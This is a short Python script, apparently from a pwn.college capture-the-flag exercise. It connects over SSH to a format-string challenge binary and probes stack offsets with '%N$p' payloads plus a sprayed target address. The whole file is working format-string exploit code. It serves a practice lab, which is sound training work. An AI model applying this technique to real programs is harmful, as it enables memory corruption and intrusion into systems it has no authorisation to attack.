import subprocess
import struct

ADDR = 0x4040E0
SSH = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.1",
]

base = "AAA |"
spray = b""
for shift in range(8):
    spray += b"\x00" * shift + struct.pack("<Q", ADDR)

for idx in range(1, 120):
    fmt = (base + f"%{idx}$p").encode()
    payload = fmt + spray
    res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    out = res.stdout.decode("latin-1", errors="ignore")
    if "0x4040e00000000000" in out:
        print("idx", idx)
        print(out)
        break
else:
    print("not found")
